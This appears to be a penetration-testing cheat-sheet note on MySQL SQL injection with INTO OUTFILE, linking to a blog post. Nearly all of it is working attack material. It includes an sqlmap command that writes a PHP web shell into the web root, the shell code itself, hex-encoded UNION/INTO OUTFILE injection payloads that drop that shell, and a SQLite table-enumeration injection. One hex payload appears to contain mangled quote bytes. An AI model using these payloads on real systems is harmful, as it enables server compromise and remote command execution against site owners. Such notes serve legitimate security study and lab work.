# Into outfile
[https://websec.wordpress.com/2007/11/17/mysql-into-outfile/](https://websec.wordpress.com/2007/11/17/mysql-into-outfile/) 

```text-plain
sqlmap -r /tmp/req.sql --file-dest="/var/www/html/shell.php" --file-write="/root/shells/shell.php"
```

So to exploit this, we encoded a simple PHP payload to HEX:

`<?php system($_GET["cmd"]); ?>`

And added it to our exploit:

```text-plain
" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```

```text-plain
'INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

`Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d INTO OUTFILE '/var/www/html/shell.php'` `<?php system("ls"); ?>`

`' AND "1" = “2” UNION SELECT title FROM challenges WHERE type ="table" AND name NOT LIKE 'sqlite_%`